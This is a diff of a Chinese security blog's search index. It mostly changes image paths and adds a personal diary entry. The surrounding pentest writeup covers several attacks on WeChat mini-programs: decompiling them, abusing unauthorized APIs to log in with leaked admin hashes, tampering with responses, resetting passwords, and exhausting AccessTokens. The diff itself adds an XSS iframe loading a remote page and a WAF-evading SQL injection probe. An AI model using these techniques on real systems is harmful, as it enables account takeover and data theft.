@@ -8289,7 +8289,7 @@
 <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331224344902.png" alt="image-20220331224344902" style="zoom: 33%;" />
 
 <p>，直接打开浏览器访问 <code>192.168.56.1:8889</code> ，下载证书</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20220331224640319.png" alt="image-20220331224640319"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/image-20220331224640319.png" alt="image-20220331224640319"></p>
 <p>打开文件管理器，在<code>sdcard-&gt;Download</code>目录中可以看到下载下来的证书</p>
 <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220331224822198.png" alt="image-20220331224822198" style="zoom: 33%;" />
 
@@ -8317,30 +8317,33 @@
 <p>好评</p>
 </blockquote>
 <h3 id="2-手工反编译"><a href="#2-手工反编译" class="headerlink" title="2. 手工反编译"></a>2. 手工反编译</h3><p>我们在模拟器里登录微信，然后随便选择一个微信小程序打开</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640.png" alt="图片"></p>
 <p>打开文件管理器，在<code>data/data/com.tencent.mm/MicroMsg</code>会生成一个md5加密命名的文件夹（如果打开微信小程序过多，同时有多个文件夹不容易识别的情况，可以选择把<code>MicroMsg</code>文件夹所有内容删除掉，再去重新打开微信小程序，就会得到唯一一个MD5加密命名的文件夹啦）</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214971.png" alt="图片"></p>
+<blockquote>
+<p>  有的微信小程序包在其他位置：data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;appbrand&#x2F;pkg&#x2F;general</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214971.png" alt="图片"></p>
 <p>在该文件夹下的<code>appbrand/pkg</code>目录下找到<code>.wxapkg</code>后缀结尾的文件，其中只有几MB大小的为刚刚打开的小程序的文件</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214972.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214972.png" alt="图片"></p>
 <p>点击勾选之后，来到根目录下的<code>mnt/shared/App</code>目录，打开右上角三个<code>.</code>的功能菜单选择粘贴选择项，将文件复制到该文件夹</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214973.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214973.png" alt="图片"></p>
 <p>这里的文件夹就是电脑共享的文件夹，点击打开电脑文件夹</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214984.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214984.png" alt="图片"></p>
 <p>可以找到小程序的文件</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214985.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214985.png" alt="图片"></p>
 <p>这里推荐有 GUI 界面的反编译工具：<a href="https://github.com/ezshine/wxapkg-convertor/releases">https://github.com/ezshine/wxapkg-convertor/releases</a></p>
 <p>直接将文件鼠标拖拽到 GUI 界面即可开始反编译，在拖入文件的当前目录得到反编译生成的文件夹</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214986.png" alt="图片"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214987.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214986.png" alt="图片"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214987.png" alt="图片"></p>
 <p>然后就可以开始舒服的看看 js 代码啦</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214988.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214988.png" alt="图片"></p>
 <h2 id="0x03-反编译源码代码审计"><a href="#0x03-反编译源码代码审计" class="headerlink" title="0x03 反编译源码代码审计"></a>0x03 反编译源码代码审计</h2><p>举例某小程序审计，在登录界面爆破无关之后，直接反编译拖源码审计一下，反编译出来的源码，我们着重看 js 文件及其配置文件即可。第一想法就是先找一些接口，尝试是否有未授权之类的漏洞，下面就是找到的一处路由<code>user/getUserInfoByUsername</code></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214989.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-16487386214989.png" alt="图片"></p>
 <p>可以看到发送数据类型为 json 格式，并且参数为<code>username</code>和<code>school</code>，于是尝试构造请求发送</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149810.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149810.png" alt="图片"></p>
 <p>成功获取系统管理员详细信息，其中包括关键的密码。获取到 md5 加密形式的密码密文后，本来还想去 cmd5 去解一下， 但是接下来注意到一个登录路由<code>user/loginByUsernameAndPassword</code></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149811.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149811.png" alt="图片"></p>
 <p>从源码中都看得出来就是通过账号密码去登录，刚刚未授权得到的密码存储为 md5 加密形式，想来登录应该也是进行 md5 加密的形式，所以直接发送加密形式的密码即可，构造请求发送</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149812.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149812.png" alt="图片"></p>
 <p>验证登录成功。这类常常出现未授权漏洞的路由命名方式大抵都是</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxByXXXId</span><br><span class="line">xxxByUsername</span><br><span class="line">xxxbyphone</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
 
@@ -8377,11 +8380,11 @@
 <hr>
 <p>下面举例其他类型的漏洞审计案例，这里目的是为了说明小程序有哪些漏洞可以挖</p>
 <h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>反编译出来的源码泄露登录账号密码，这里是因为在 js 文件中写死了账号密码，只做了前端验证导致的漏洞，从下面贴的两个小程序源码中可以看到</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149913.png" alt="图片"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149914.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149913.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149914.png" alt="图片"></p>
 <p>在时间稍稍往前的小程序中，还经常会有泄露小程序<code>secret</code>的情况，简直就是把打开保险箱的密码放在你面前</p>
 <h3 id="未授权接口"><a href="#未授权接口" class="headerlink" title="未授权接口"></a>未授权接口</h3><p>仔细翻找 js 文件能找到不少未鉴权的 api 接口（可以着重注意配置文件，不少配置文件都会写上路由列表），例如该 api 返回大量用户敏感信息</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149915.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149915.png" alt="图片"></p>
 <p>测试未授权时，有一些小技巧：例如当在 GET 或者 POST 传参中有<code>token</code>等鉴权参数，例如</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/GetUserInfo?id=xxx&amp;token=xxxx HTTP/1.1</span><br></pre></td></tr></table></figure>
 
@@ -8391,24 +8394,24 @@
 <p>当我尝试将<code>uid</code>参数改成其他用户时，返回权限不足，尝试将<code>token</code>删除</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /wx/queryOrders?orderState=&amp;serviceUid=&amp;pageNum=1&amp;pageSize=200&amp;uid=2000</span><br></pre></td></tr></table></figure>
 
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149916.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149916.png" alt="图片"></p>
 <p>除此之外，测试一些参数，比如手机号，不知道该系统用户手机号时，可以试试像上面说的将其置空，往往运气好能碰上系统后端查询使用的模糊查询为空时返回所有信息，下面贴图的案例就是将手机号参数置空后，成功获取到账号详细信息</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149917.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149917.png" alt="图片"></p>
 <h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>下面案例举例一个通过 Cookie 中的参数进行鉴权的漏洞，可以通过修改<code>NetId</code>中的值来遍历获取用户信息。此类漏洞的挖掘在鉴权处的源码，审计时可以着重审计其验证流程</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149918.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149918.png" alt="图片"></p>
 <p>当时也是依靠这个漏洞获取到 VPN 账号密码，得以进入内网渗透</p>
 <h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><p>使用 burpsuite 抓取管理员登录数据包，获取返回包</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149919.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149919.png" alt="图片"></p>
 <p>该处在<code>login.js</code>文件登录判断条件中，源码判断返回为 0 时登录成功，所以我们将返回包从 1 改成 0 即可登录成功。</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149920.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149920.png" alt="图片"></p>
 <p>还有 任意密码重置 ，该处漏洞倒也是在黑盒中无意发现，在修改密码处需要验证对应账号接收到的短信验证码。但怀着尝试的心态通过 buspsuite 抓包绕过 js 限制，随意填写验证码便可以重置任意用户密码，不细心就会很容易忽视的点</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149921.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149921.png" alt="图片"></p>
 <h3 id="appid和secret的利用"><a href="#appid和secret的利用" class="headerlink" title="appid和secret的利用"></a>appid和secret的利用</h3><p>当时测试数据的时候，发现添加字符<code>%%</code>会导致其后端报错，返回<code>appid</code>和<code>secret</code></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149922.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149922.png" alt="图片"></p>
 <p>获取到的appid和secret可以到微信的官方接口去自由生成微信小程序的命脉<code>AccessToken</code></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862150023.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862150023.png" alt="图片"></p>
 <p>拿到 AccessToken，相当于可以控制整个小程序了，并且 AccessToken 微信每天只能生成20次，不断请求满20次的话可以使小程序崩溃无法使用。</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862150024.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862150024.png" alt="图片"></p>
 <p>其次利用AccessToken可以执行相当多的其他操作，见微信官方文档，这里就不画蛇添足了。</p>
 <p>工具自取链接：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1vMVvmm2n2wyr3vhzp91iqA </span><br><span class="line">提取码：jpho</span><br></pre></td></tr></table></figure>
@@ -8877,9 +8880,17 @@
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="通用漏洞"><a href="#通用漏洞" class="headerlink" title="通用漏洞"></a>通用漏洞</h3><p>dom型xss：</p>
 <p>凡是可以控制的变量，都要注意是否回显到html中，有时候回显了但打开源码才能看到。</p>
 <p>为什么单独说domxss，是因为xray高级版扫描器只能扫反射型xss和存储型xss。这是容易忽视的点。</p>
+<p>xss弹窗：</p>
+<p>使用iframe标签加载远程html：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=http://xxx/test.html&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
 <p>csrf：</p>
 <p>凡是进行操作的点，没看到token的点都得测，post&#x2F;get 方式互换，也是我较为忽略的点。</p>
 <p>sqli：</p>
+<p>一般使用payload，绕过waf检测是否存在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0||1 like 1</span><br></pre></td></tr></table></figure>
+
+<p>常规的payload容易被拦</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">*</span><br><span class="line">%</span><br><span class="line"># 宽字节</span><br><span class="line">%df%27%df%22</span><br><span class="line">1&#x27; or sleep(10) </span><br><span class="line">编码</span><br></pre></td></tr></table></figure>
 
 <p>ssrf：</p>
@@ -8945,7 +8956,7 @@
 <p>订单、收货地址、资料修改(能x则x)</p>
 <p><strong>添加用户</strong>：普通用户可能不存在这个功能，管理员有，但普通用户只要知道添加用户的请求包，一样可以实现这个功能。</p>
 <p><strong>双写请求包的参数</strong></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList/image-20220808165550290.png" alt="image-20220808165550290"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList/image-20220808165550290.png" alt="image-20220808165550290"></p>
 <ol start="2">
 <li><strong>后台日志处记录登录ip</strong></li>
 </ol>
@@ -12261,7 +12272,7 @@
 <p>不断探索奇妙而新奇的事。</p>
 <h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>重新唤起自己对网络安全的热爱，所幸的是我还在努力，写了一些虽然技术含量不高的工具，但总归还是在前进，没有停下。</p>
 <p>生命如潮，潮起潮落，未来的路还很长，一起加油，共勉，永远爱你</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/18.jpg" alt="18"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/18.jpg" alt="18"></p>
 ]]></content>
       <categories>
         <category>实习系列</category>
@@ -12346,5 +12357,549 @@
       <tags>
         <tag>Sql</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>如果睡不着</title>
+    <url>/posts/55f500f4.html</url>
+    <content><![CDATA[<blockquote>
+<p>  我的生活正处在前所未有的低谷中，还在不停不停的下坠……</p>
+</blockquote>
+<p>我已经忘了从什么时候开始的了，我决定写一篇文章来重新审视我的内心。</p>
+<h3 id="zwq"><a href="#zwq" class="headerlink" title="zwq"></a>zwq</h3><p>zwq这三个字母就像一个陷阱，当我发现我已经沦陷其中的时候，我已经无法脱身了。</p>
+<p>我无法去假设没有zwq出现的时间线，我的人生会是什么样的。</p>
+<p>但不妨让我想象一下。</p>
+<h3 id="no-zwq"><a href="#no-zwq" class="headerlink" title="no zwq"></a>no zwq</h3><p>要去想象那条时间线的未来，我必须回想起在那之前，我是一个怎样的人。</p>
+<p>我不断的游离于一个个新鲜中，以填满我贫瘠的内心世界，在一个人的时候，我会享受孤独，Eminem和法老是我的精神信仰和耳机常驻，给我力量去面对各种挑战，因为那时候我没有一个经常联系的朋友，生命中百分之九十九的时间都是一个人，如果你们没有经历过的话，你们根本不懂。</p>
+<p>同时我也是一个自卑、虚伪的人，你可以把想象到的缺点都套到我的身上，然后你会发现大约有百分之九十都是正确的，把我想象成一只阴沟里的老鼠吧，我不需要同情和怜悯。</p>
+<p>我是一个怎样的人，我也忘了，大概就是这样了。</p>
+<p>所以那条时间线的我会是怎么样的呢。</p>
+<p>有一个是肯定的，我仍然会沉浸在不停的寻找新鲜感中，来当作内心的慰藉，直到世界寂灭。而满足情感后，我会做些什么，大概是不断的自律。</p>
+<p>突然发现，好像没什么好想象的，一眼望得到头，太扫兴了。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>既然未来的我无法适应未来的生活，那么生命便会自己寻找出路。</p>
+<p>我会重新做回以前的我，以此来保护未来的我。</p>
+<p>我曾经说过，“青年的我绝不会向中年的我妥协！”</p>
+]]></content>
+      <categories>
+        <category>生活杂谈</category>
+      </categories>
+      <tags>
+        <tag>风中的琐碎</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
